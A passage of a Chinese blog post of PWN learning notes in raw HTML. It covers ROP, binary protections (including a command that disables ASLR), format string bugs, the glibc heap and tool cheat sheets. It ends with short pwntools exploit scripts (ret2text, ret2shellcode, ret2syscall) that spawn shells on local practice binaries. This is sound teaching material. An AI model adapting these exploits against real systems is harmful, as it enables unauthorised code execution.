src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103232118467.png\" alt=\"image-20201103232118467\"></p>\n<h3 id=\"ret2libc\"><a href=\"#ret2libc\" class=\"headerlink\" title=\"ret2libc\"></a>ret2libc</h3><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231611494.png\" alt=\"image-20201103231611494\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111165405311.png\" alt=\"image-20201111165405311\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111170622828.png\" alt=\"image-20201111170622828\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112200053036.png\" alt=\"image-20201112200053036\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112201440668.png\" alt=\"image-20201112201440668\"></p>\n<h1 id=\"返回导向编程\"><a href=\"#返回导向编程\" class=\"headerlink\" title=\"返回导向编程\"></a>返回导向编程</h1><h2 id=\"基础-1\"><a href=\"#基础-1\" class=\"headerlink\" title=\"基础\"></a>基础</h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105154134220.png\" alt=\"image-20201105154134220\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105160249721.png\" alt=\"image-20201105160249721\"></p>\n<h2 id=\"攻击-1\"><a href=\"#攻击-1\" class=\"headerlink\" title=\"攻击\"></a>攻击</h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105191117470.png\" alt=\"image-20201105191117470\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105192140397.png\" alt=\"image-20201105192140397\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105193656915.png\" alt=\"image-20201105193656915\"></p>\n<p><strong>调用构造</strong></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105200045153.png\" alt=\"image-20201105200045153\"></p>\n<h2 id=\"x64\"><a href=\"#x64\" class=\"headerlink\" title=\"x64\"></a>x64</h2><p>存放参数放入寄存器中</p>\n<p>但超过6个就会放入栈中</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201115233600880.png\" alt=\"image-20201115233600880\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116194218608.png\" alt=\"image-20201116194218608\"></p>\n<h1 id=\"动态链接过程\"><a href=\"#动态链接过程\" class=\"headerlink\" title=\"动态链接过程\"></a>动态链接过程</h1><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106223140061.png\" alt=\"image-20201106223140061\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106232428225.png\" alt=\"image-20201106232428225\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106233935531.png\" alt=\"image-20201106233935531\"></p>\n<h1 id=\"保护措施\"><a href=\"#保护措施\" class=\"headerlink\" title=\"保护措施\"></a>保护措施</h1><h2 id=\"RELRO\"><a href=\"#RELRO\" class=\"headerlink\" title=\"RELRO\"></a>RELRO</h2><p>Relocation Read-Only </p>\n<p>它分为两种，Partial RELRO 和 Full RELRO，即 部分RELRO 和 完全RELRO。</p>\n<p><strong>部分RELRO</strong> 是 GCC 的默认设置，几乎所有的二进制文件都至少使用 部分RELRO。但是从攻击者角度来看呢，部分RELRO 不堪一击，因为它仅仅使 GOT 存储在 bss 段之前，这样仅仅只能防止全局变量上的缓冲区溢出从而覆盖 GOT。<br><strong>完全RELRO</strong> 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o a a.c // 默认情况下，是Partial RELRO</span><br><span class=\"line\">gcc -z norelro -o a a.c // 关闭，即No RELRO</span><br><span class=\"line\">gcc -z lazy -o a a.c // 部分开启，即Partial RELRO</span><br><span class=\"line\">gcc -z now -o a a.c // 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>\n<h2 id=\"The-NX-bits\"><a href=\"#The-NX-bits\" class=\"headerlink\" title=\"The NX bits\"></a>The NX bits</h2><p>主要是保护栈区不可执行，通常在checksec中可以查看</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231211223.png\" alt=\"image-20201103231211223\"></p>\n<h2 id=\"ASLR\"><a href=\"#ASLR\" class=\"headerlink\" title=\"ASLR\"></a>ASLR</h2><p>地址随机化，也很好理解，就是不想让你找到真正的内存地址</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231430738.png\" alt=\"image-20201103231430738\"></p>\n<p>改变值的命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo -s <span class=\"built_in\">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>\n<p><strong>ASLR 并不负责代码段和数据段的随机化，这由 PIE 负责，但是只有在开启 ASLR 之后，PIE 才会生效。</strong></p>\n<h2 id=\"Canary\"><a href=\"#Canary\" class=\"headerlink\" title=\"Canary\"></a>Canary</h2><p><strong>这种栈保护措施在栈帧中任何局部缓冲区与栈状态之间存储一个特殊的金丝雀值</strong>，</p>\n<p>也称哨兵值，通俗理解，我们可以把它看成一个cookie</p>\n<p>它是程序每次运行时随机产生的。</p>\n<p>在恢复寄存器状态之前和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个函数的某个操作改变了，如果发现异常程序会中止。<br>最近的 GCC 版本可能会试图自动插入这种溢出检测值。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o a a.c // GCC 可能会试图自动插入这种溢出检测值</span><br><span class=\"line\">gcc -fno-stack-protector -o a a.c //禁用栈保护</span><br><span class=\"line\">gcc -fstack-protector -o a a.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class=\"line\">gcc -fstack-protector-all -o a a.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>\n<h2 id=\"PIE\"><a href=\"#PIE\" class=\"headerlink\" title=\"PIE\"></a>PIE</h2><p>位置无关代码，负责代码段和数据段bss</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o <span class=\"built_in\">test</span> test.c // 默认情况下，不开启PIE</span><br><span class=\"line\">gcc -fpie -pie -o <span class=\"built_in\">test</span> test.c // 开启PIE，此时强度为1</span><br><span class=\"line\">gcc -fPIE -pie -o <span class=\"built_in\">test</span> test.c // 开启PIE，此时为最高强度2</span><br><span class=\"line\">gcc -fpic -o <span class=\"built_in\">test</span> test.c // 开启PIC，此时强度为1，不会开启PIE</span><br><span class=\"line\">gcc -fPIC -o <span class=\"built_in\">test</span> test.c // 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure>\n<h1 id=\"栈迁移\"><a href=\"#栈迁移\" class=\"headerlink\" title=\"栈迁移\"></a>栈迁移</h1><p>控制ESP</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117163123759.png\" alt=\"image-20201117163123759\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165305864.png\" alt=\"image-20201117165305864\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165321403.png\" alt=\"image-20201117165321403\"></p>\n<h1 id=\"格式化字符串漏洞\"><a href=\"#格式化字符串漏洞\" class=\"headerlink\" title=\"格式化字符串漏洞\"></a>格式化字符串漏洞</h1><p><strong>前提：有printf 且第一个参数可控</strong></p>\n<ol>\n<li>泄露栈内存</li>\n<li>泄露任意地址内存</li>\n<li>篡改栈内存</li>\n<li>篡改任意地址内存</li>\n</ol>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117203103431.png\" alt=\"image-20201117203103431\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%x</span><br><span class=\"line\">%p 打印栈上内容</span><br><span class=\"line\">%s 打印栈上解析地址的内容</span><br><span class=\"line\">%n 写内容(打印字节的个数)</span><br><span class=\"line\">printf(&quot;%d%d%d&quot;,a,b,c)</span><br><span class=\"line\">printf(&quot;%3$d&quot;,a,b,c) 控制第三个参数</span><br><span class=\"line\"></span><br><span class=\"line\">printf(&quot;%20c&quot;,c)</span><br><span class=\"line\">printf(&quot;aaa%n&quot;,c)</span><br><span class=\"line\">printf(&quot;%7$n&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">%n 0x00000004</span><br><span class=\"line\">%hn 0x0004</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117213226675.png\" alt=\"image-20201117213226675\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118152914484.png\" alt=\"image-20201118152914484\"></p>\n<h1 id=\"堆\"><a href=\"#堆\" class=\"headerlink\" title=\"堆\"></a>堆</h1><h2 id=\"什么是堆\"><a href=\"#什么是堆\" class=\"headerlink\" title=\"什么是堆\"></a>什么是堆</h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118173315748.png\" alt=\"image-20201118173315748\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118223608385.png\" alt=\"image-20201118223608385\"></p>\n<h2 id=\"堆管理器\"><a href=\"#堆管理器\" class=\"headerlink\" title=\"堆管理器\"></a>堆管理器</h2><ul>\n<li>逻辑链表：指针连起来,把同类的<code>chunk</code>连起来</li>\n<li>物理链表：通过<code>size</code>域组织相邻<code>chunk</code>之间的关系，判断相邻是否为<code>free chunk</code>，若是，则合并</li>\n</ul>\n<h3 id=\"arena\"><a href=\"#arena\" class=\"headerlink\" title=\"arena\"></a><strong>arena</strong></h3><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118224006678.png\" alt=\"image-20201118224006678\"></p>\n<h3 id=\"chunk\"><a href=\"#chunk\" class=\"headerlink\" title=\"chunk\"></a><strong>chunk</strong></h3><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118230656646.png\" alt=\"image-20201118230656646\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110607276.png\" alt=\"image-20201119110607276\"></p>\n<h4 id=\"malloced-chunk\"><a href=\"#malloced-chunk\" class=\"headerlink\" title=\"malloced chunk\"></a><strong>malloced chunk</strong></h4><p><strong>chunk</strong></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118233221511.png\" alt=\"image-20201118233221511\"></p>\n<p><code>pre size</code>:记录上一个free chunk的大小，若上一个chunk在用，则<code>pre size</code>将被合并</p>\n<p><code>size</code>:整个chunk 的大小</p>\n<p><strong>top chunk</strong></p>\n<p>从操作系统批发的不分给用户的chunk</p>\n<h4 id=\"free-chunk\"><a href=\"#free-chunk\" class=\"headerlink\" title=\"free chunk\"></a><strong>free chunk</strong></h4><p>small bin chunk</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119105945419.png\" alt=\"image-20201119105945419\"></p>\n<p>large bin chunk</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110352335.png\" alt=\"image-20201119110352335\"></p>\n<p>fast bin chunk</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110501531.png\" alt=\"image-20201119110501531\"></p>\n<p><strong>pre size 复用</strong></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119114224011.png\" alt=\"image-20201119114224011\"></p>\n<h3 id=\"bin\"><a href=\"#bin\" class=\"headerlink\" title=\"bin\"></a><strong>bin</strong></h3><p>分配方式：<code>fastbin</code> —&gt;<code>unsorted bin</code>—&gt;<code>small bin</code>/<code>large bin</code> </p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162311702.png\" alt=\"image-20201119162311702\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115539452.png\" alt=\"image-20201119115539452\"></p>\n<h4 id=\"tcache\"><a href=\"#tcache\" class=\"headerlink\" title=\"tcache\"></a>tcache</h4><h4 id=\"fastbins\"><a href=\"#fastbins\" class=\"headerlink\" title=\"fastbins\"></a><strong>fastbins</strong></h4><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162151833.png\" alt=\"image-20201119162151833\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163702351.png\" alt=\"image-20201119163702351\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119120748019.png\" alt=\"image-20201119120748019\"></p>\n<p><strong>bin的双向链表</strong></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1.png\" alt=\"1\"></p>\n<h4 id=\"unsorted-bin\"><a href=\"#unsorted-bin\" class=\"headerlink\" title=\"unsorted bin\"></a><strong>unsorted bin</strong></h4><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163039733.png\" alt=\"image-20201119163039733\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163232880.png\" alt=\"image-20201119163232880\"></p>\n<h4 id=\"small-bins\"><a href=\"#small-bins\" class=\"headerlink\" title=\"small bins\"></a><strong>small bins</strong></h4><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163209378.png\" alt=\"image-20201119163209378\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163319068.png\" alt=\"image-20201119163319068\"></p>\n<h4 id=\"large-bins\"><a href=\"#large-bins\" class=\"headerlink\" title=\"large bins\"></a>large bins</h4><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163433718.png\" alt=\"image-20201119163433718\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163457182.png\" alt=\"image-20201119163457182\"></p>\n<p><strong>实例</strong></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115142092.png\" alt=\"image-20201119115142092\"></p>\n<h1 id=\"堆漏洞\"><a href=\"#堆漏洞\" class=\"headerlink\" title=\"堆漏洞\"></a>堆漏洞</h1><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163935171.png\" alt=\"image-20201119163935171\"></p>\n<p><strong>fastbin</strong></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201121183321818.png\" alt=\"image-20201121183321818\"></p>\n<p><strong>unsorted bin</strong></p>\n<h1 id=\"工具学习\"><a href=\"#工具学习\" class=\"headerlink\" title=\"工具学习\"></a>工具学习</h1><h2 id=\"pwntools\"><a href=\"#pwntools\" class=\"headerlink\" title=\"pwntools\"></a>pwntools</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Import pwntools</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#Local communication</span></span><br><span class=\"line\">io = process(<span class=\"string\">\"./a.out\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#Telecommunication</span></span><br><span class=\"line\">io = remote(<span class=\"string\">\"ip\"</span>,port)</span><br><span class=\"line\"><span class=\"comment\">#Receive message</span></span><br><span class=\"line\">io.recvline()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b\":\"</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b\" : \"</span>,drop = <span class=\"literal\">True</span>)</span><br><span class=\"line\">io.recv()</span><br><span class=\"line\"><span class=\"comment\">#Send message</span></span><br><span class=\"line\">io.sendline(<span class=\"string\">b\"abc\"</span>)</span><br><span class=\"line\">io.send(p32(<span class=\"number\">0</span>)+<span class=\"string\">b\"\\x0a\"</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b\" :\"</span>,str)</span><br><span class=\"line\"><span class=\"comment\">#Interactive</span></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"><span class=\"comment\">#shellcode</span></span><br><span class=\"line\">shellcraft.sh()  <span class=\"comment\">#in sh environment</span></span><br><span class=\"line\">shellcraft.amd64.sh() <span class=\"comment\">#64 bit</span></span><br><span class=\"line\">asm(shellcraft.sh()) <span class=\"comment\">#machine code</span></span><br><span class=\"line\">asm(shellcraft.sh()).ljust(<span class=\"number\">112</span>,<span class=\"string\">b'a'</span>) <span class=\"comment\">#if the length is less than 112,then it will be supplemented whith a. </span></span><br><span class=\"line\"><span class=\"comment\">#if you want to attack the 64 bit,pls add it</span></span><br><span class=\"line\">context.arch = <span class=\"string\">\"amd64\"</span></span><br><span class=\"line\"><span class=\"comment\">#find strings</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./filename\"</span>)</span><br><span class=\"line\">hex(next(elf.search(<span class=\"string\">b\"/bin/sh\"</span>)))</span><br><span class=\"line\"><span class=\"comment\">#elf file</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./file\"</span>)</span><br><span class=\"line\">hex(elf.got[<span class=\"string\">\"puts\"</span>])</span><br><span class=\"line\">hex(elf.plt[<span class=\"string\">\"system\"</span>])</span><br><span class=\"line\">hex(elf.symbols[<span class=\"string\">\"buf2\"</span>])</span><br><span class=\"line\"><span class=\"comment\">#flat</span></span><br><span class=\"line\">flat([<span class=\"number\">1</span>,<span class=\"number\">2</span>])</span><br><span class=\"line\"><span class=\"comment\">#generate data</span></span><br><span class=\"line\">cyclic(<span class=\"number\">60</span>)</span><br><span class=\"line\"><span class=\"comment\">#byte data</span></span><br><span class=\"line\">p32(<span class=\"number\">1234</span>)</span><br><span class=\"line\">\\xd2\\x04\\x00\\x00</span><br><span class=\"line\">u32(<span class=\"string\">\"\\xd2\\x04\\x00\\x00\"</span>)</span><br><span class=\"line\"><span class=\"number\">1234</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"gdb\"><a href=\"#gdb\" class=\"headerlink\" title=\"gdb\"></a>gdb</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#start</span></span><br><span class=\"line\">gdb file</span><br><span class=\"line\">start</span><br><span class=\"line\"><span class=\"comment\">#run the executable</span></span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"comment\">#backtrace</span></span><br><span class=\"line\">backtrace</span><br><span class=\"line\"><span class=\"comment\">#return</span></span><br><span class=\"line\"><span class=\"built_in\">return</span></span><br><span class=\"line\"><span class=\"comment\">#breakpoint</span></span><br><span class=\"line\">b main</span><br><span class=\"line\">b <span class=\"keyword\">function</span></span><br><span class=\"line\">b *0x</span><br><span class=\"line\"><span class=\"comment\">#information for breakpoint</span></span><br><span class=\"line\">info b</span><br><span class=\"line\"><span class=\"comment\">#delete the breakpoint</span></span><br><span class=\"line\">d num</span><br><span class=\"line\"><span class=\"comment\">#run</span></span><br><span class=\"line\">r </span><br><span class=\"line\"><span class=\"comment\">#next step over</span></span><br><span class=\"line\">n </span><br><span class=\"line\"><span class=\"comment\">#step in </span></span><br><span class=\"line\">s  </span><br><span class=\"line\"><span class=\"comment\">#stack</span></span><br><span class=\"line\">stack size</span><br><span class=\"line\">stack 24</span><br><span class=\"line\"><span class=\"comment\">#virtual memory map</span></span><br><span class=\"line\"><span class=\"comment\">#to look rwx segment</span></span><br><span class=\"line\">vmmap</span><br><span class=\"line\"><span class=\"comment\">#plt </span></span><br><span class=\"line\">plt</span><br><span class=\"line\">x p</span><br><span class=\"line\">x/20 p</span><br><span class=\"line\"><span class=\"comment\">#got</span></span><br><span class=\"line\">got</span><br><span class=\"line\"><span class=\"comment\">#chunk</span></span><br><span class=\"line\">fastbin</span><br><span class=\"line\">heap</span><br><span class=\"line\"><span class=\"comment\">#libc</span></span><br><span class=\"line\">b *<span class=\"variable\">$rebase</span>(0x18540)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pause()</span><br><span class=\"line\">attach pid</span><br><span class=\"line\"><span class=\"built_in\">return</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"IDA\"><a href=\"#IDA\" class=\"headerlink\" title=\"IDA\"></a>IDA</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">G  直接跳转地址</span><br><span class=\"line\">shift+f12  打开字符串窗口</span><br><span class=\"line\">shift+E  提取字符串</span><br><span class=\"line\">n  重命名变量</span><br></pre></td></tr></table></figure>\n<h2 id=\"ROPgadget\"><a href=\"#ROPgadget\" class=\"headerlink\" title=\"ROPgadget\"></a>ROPgadget</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary filename --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"one-gadget\"><a href=\"#one-gadget\" class=\"headerlink\" title=\"one_gadget\"></a>one_gadget</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">libcbase + one_gadget_address</span><br></pre></td></tr></table></figure>\n<h1 id=\"练习题\"><a href=\"#练习题\" class=\"headerlink\" title=\"练习题\"></a>练习题</h1><p>非常简单，适合入门</p>\n<h2 id=\"栈溢出\"><a href=\"#栈溢出\" class=\"headerlink\" title=\"栈溢出\"></a>栈溢出</h2><h3 id=\"ret2text-1\"><a href=\"#ret2text-1\" class=\"headerlink\" title=\"ret2text\"></a>ret2text</h3><p>直接有后门函数，所以我们只需要把垃圾数据填满覆盖ebp，然后让返回地址返回后门函数的地址就行</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">\"./ret2text\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'a'</span>*<span class=\"number\">20</span> + p32(<span class=\"number\">0x8048522</span>)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"ret2shellcode-1\"><a href=\"#ret2shellcode-1\" class=\"headerlink\" title=\"ret2shellcode\"></a>ret2shellcode</h3><p>自己写入shellcode(bss)，然后溢出地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> * </span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">\"./ret2shellcode\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">buf2 = <span class=\"number\">0x804a080</span></span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(shellcraft.sh()).ljust(<span class=\"number\">112</span>,<span class=\"string\">b'a'</span>)</span><br><span class=\"line\">payload = shellcode + p32(buf2)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"ret2syscall\"><a href=\"#ret2syscall\" class=\"headerlink\" title=\"ret2syscall\"></a>ret2syscall</h3><p>ROPgadget</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">\"./ret2syscall\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_eax = <span class=\"number\">0x80bb196</span></span><br><span class=\"line\">pop_edx = <span class=\"number\">0x806eb90</span></span><br><span class=\"line\">int_80 = <span class=\"number\">0x08049421</span></span><br><span class=\"line\">payload =flat([ <span class=\"string\">b'A'</span>* <span class=\"number\">112</span> , pop_eax , <span class=\"number\">0xb</span> ,pop_edx, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0x80be408</span> ,int_80])</span><br><span class=\"line\"></span><br><span class=\"line\">print(io.recv())</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"ret2libc1\"><a href=\"#ret2libc1\" class=\"headerlink\" title=\"ret2libc1\"></a>ret2libc1</h3><p><img 